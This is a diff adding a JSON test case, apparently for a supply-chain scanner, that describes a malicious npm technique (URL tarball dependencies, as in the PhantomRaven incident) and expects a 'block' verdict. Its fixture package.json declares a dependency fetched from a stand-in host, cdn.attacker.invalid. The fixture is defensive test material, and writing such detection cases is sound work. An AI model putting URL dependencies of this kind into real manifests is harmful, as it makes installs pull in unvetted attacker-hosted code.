@@ -1,0 +1,19 @@
+{
+  "id": "npm-url-dependency",
+  "title": "package.json declares a dependency fetched from an attacker URL",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "A dependency is specified as an http(s) tarball URL instead of a registry range, so npm fetches and installs attacker-hosted code that registry tooling never sees.",
+  "trigger": "npm install",
+  "incident": "PhantomRaven: 126 npm packages fetched payloads from URL dependencies (shown as '0 dependencies')",
+  "sources": [
+    "https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies"
+  ],
+  "notes": "The dependency URL is a reserved .invalid tarball that does not exist; nothing is fetched or run.",
+  "files": {
+    "package.json": "{\n  \"name\": \"chart-lib\",\n  \"version\": \"2.4.0\",\n  \"dependencies\": {\n    \"left-pad\": \"^1.3.0\",\n    \"render-core\": \"https://cdn.attacker.invalid/render-core-1.0.0.tgz\"\n  }\n}\n",
+    "src/chart.js": "module.exports = { draw: () => {} };\n",
+    "README.md": "# chart-lib\n\nCharts.\n"
+  }
+}
